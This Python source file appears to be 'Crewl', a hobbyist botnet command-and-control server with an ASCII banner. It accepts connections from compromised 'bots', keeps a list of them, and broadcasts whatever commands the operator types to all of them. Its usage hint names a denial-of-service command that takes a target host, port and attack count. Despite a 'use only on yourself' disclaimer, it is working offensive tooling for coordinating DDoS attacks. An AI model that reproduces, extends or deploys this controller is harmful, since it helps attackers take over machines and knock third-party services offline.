import socket
import threading
import os
import sys
import time


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("192.168.1.182", 2121))
server_socket.listen(10)


# colors
class color:
    END = '\33[0m'
    BOLD = '\33[1m'
    ITALIC = '\33[3m'
    URL = '\33[4m'
    BLINK = '\33[5m'
    BLINK2 = '\33[6m'
    SELECTED = '\33[7m'

    BLACK = '\33[30m'
    RED = '\33[31m'
    GREEN = '\33[32m'
    YELLOW = '\33[33m'
    BLUE = '\33[34m'
    VIOLET = '\33[35m'
    BEIGE = '\33[36m'
    WHITE = '\33[37m'

    BLACKBG = '\33[40m'
    REDBG = '\33[41m'
    GREENBG = '\33[42m'
    YELLOWBG = '\33[43m'
    BLUEBG = '\33[44m'
    VIOLETBG = '\33[45m'
    BEIGEBG = '\33[46m'
    WHITEBG = '\33[47m'

    GREY = '\33[90m'
    RED2 = '\33[91m'
    GREEN2 = '\33[92m'
    YELLOW2 = '\33[93m'
    BLUE2 = '\33[94m'
    VIOLET2 = '\33[95m'
    BEIGE2 = '\33[96m'
    WHITE2 = '\33[97m'

    GREYBG = '\33[100m'
    REDBG2 = '\33[101m'
    GREENBG2 = '\33[102m'
    YELLOWBG2 = '\33[103m'
    BLUEBG2 = '\33[104m'
    VIOLETBG2 = '\33[105m'
    BEIGEBG2 = '\33[106m'
    WHITEBG2 = '\33[107m'


# function which runs when crewl is starting
def sysstart():
    os.system("clear")

    print(color.YELLOW2 + "▄████▄   ██▀███  ▓█████  █     █░ ██▓")
    print(color.YELLOW2 + "▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▓█░ █ ░█░▓██▒")
    print(color.YELLOW2 + "▒▓█    ▄ ▓██ ░▄█ ▒▒███   ▒█░ █ ░█ ▒██░ ")
    print(color.YELLOW2 + "▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ░█░ █ ░█ ▒██░")
    print(color.YELLOW2 + "▒ ▓███▀ ░░██▓ ▒██▒░▒████▒░░██▒██▓ ░██████▒")
    print(color.YELLOW2 + "░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▓  ░")
    print(color.YELLOW2 + "  ░  ▒     ░▒ ░ ▒░ ░ ░  ░  ▒ ░ ░  ░ ░ ▒  ░")
    print(color.YELLOW2 + "░          ░░   ░    ░     ░   ░    ░ ░   ")
    print(color.YELLOW2 + "░ ░         ░        ░  ░    ░        ░  ░")
    print(color.YELLOW2 + "░ ")
    print("")
    print("")
    print("")

    print(color.YELLOW2 + "----------------------------------------")
    print(color.YELLOW2 + "|      ● Crewl by Tilman Steck ●      |")
    print(color.YELLOW2 + "|                                      |")
    print(color.YELLOW2 + "| version > 1.0                        |")
    print(color.YELLOW2 + "| donate > https://paypal.com/acc/     |")
    print(color.YELLOW2 + "|                                      |")
    print(color.YELLOW2 + "| IMPORTANT: Do not use this against   |")
    print(color.YELLOW2 + "| other people, just on yourself!      |")
    print(color.YELLOW2 + "|                                      |")
    print(color.YELLOW2 + "| Admin User > 'King Crewl'            |")
    print(color.YELLOW2 + "| bots > 'crewler'                     |")
    print(color.YELLOW2 + "|                                      |")
    print(color.YELLOW2 + "----------------------------------------")

    print(color.YELLOW + "\n[*] Crewl ist starting... \n")

    time.sleep(1)


# this function runs always in threads for receiving data from the bots
def recieve(conn, adress):
    while True:
        if len(botNet) > 0:
            try:
                inmessage = conn.recv(1024).decode()
                if inmessage == "":
                    break
                else:
                    print(color.VIOLET2 + "\n'" + inmessage + "' from '" + str(adress) + "'")

                continue

            except socket.error as e:
                print(color.RED2 + "[*] Bot " + str(adress) + "disconnected with error " + str(e))
                remove(conn)
                break

            except KeyboardInterrupt:
                os._exit(1)

        elif len(botNet) == 0:
            print(color.RED2 + "[*] There aren't any bots online. System is stopping now!" + color.END)
            sys.exit()


# this function runs whren a new bot is connecting
def connect():
    while True:

        connection, addr = server_socket.accept()
        botNet.append(connection)

        print(color.GREEN2 + "[*] Bot connected with address " + str(addr))

        r = threading.Thread(target=recieve, args=(connection, addr))
        r.start()

        continue


# when admin user enters a command
def botnetcommand(command):
    for client in botNet:
        try:
            client.send(command.encode())
            pass

        except socket.error:
            remove(client)


# when a bot is going offline he has to removed from the botlist
def remove(conn):
    if conn in botNet:
        botNet.remove(conn)


sysstart()

botNet = []

t = threading.Thread(target=connect)
t.start()

time.sleep(1)

print(color.BLUE2 + "[*] Acitve bots: " + str(len(botNet)) + "\n")

while True:
    try:
        header = f"""\n{color.YELLOW2}{os.getlogin()}@crewl$ """

        cmdinput = input(header + color.GREEN2)

        if len(botNet) > 0:
            if cmdinput == "use" or cmdinput == "use -dos":
                print(color.RED2 + "[*] Error: Correct usage: use -dos (host) (port) (number of attacks)")

            else:
                botnetcommand(cmdinput)
                time.sleep(0.8)

            continue

        elif len(botNet) == 0:
            print(color.RED2 + "[*] There are not enough crewler online, try agian later!")

            continue

    except socket.error:
        continue

    except KeyboardInterrupt:
        print(color.RED2 + "[*] Keyboard Interrupt! Stopping system" + color.END)
        os._exit(1)
